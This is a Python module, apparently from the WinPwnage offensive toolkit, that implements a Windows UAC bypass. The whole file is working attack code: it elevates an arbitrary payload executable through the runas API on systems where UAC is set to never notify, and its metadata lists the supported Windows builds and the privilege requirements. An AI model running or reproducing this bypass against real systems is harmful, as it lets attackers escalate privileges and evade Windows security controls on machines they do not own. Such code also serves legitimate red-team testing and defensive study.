from winpwnage.core.utils import *
from winpwnage.core.prints import *

uacMethod1_info = {
	"Description": "UAC bypass using runas",
	"Method": "Windows API, this only works if UAC is set to never notify",
	"Id": "1",
	"Type": "UAC bypass",
	"Fixed In": "99999" if information().uac_level() == 1 else "0",
	"Works From": "7600",
	"Admin": False,
	"Function Name": "uacMethod1",
	"Function Payload": True,
}

def uacMethod1(payload):
	if payloads().exe(payload):
		params = payloads().exe(payload)[1].replace(payloads().exe(payload)[1].split(' ', 1)[0], '').lstrip()
		payload = payloads().exe(payload)[1].split(' ', 1)[0]

		if process().runas(payload=payload, params=params):
			print_success("Successfully elevated process ({payload} {params})".format(payload=payload, params=params))
		else:
			print_error("Unable to elevate process ({payload} {params})".format(payload=payload, params=params))
			return False
	else:
		print_error("Cannot proceed, invalid payload")
		return False
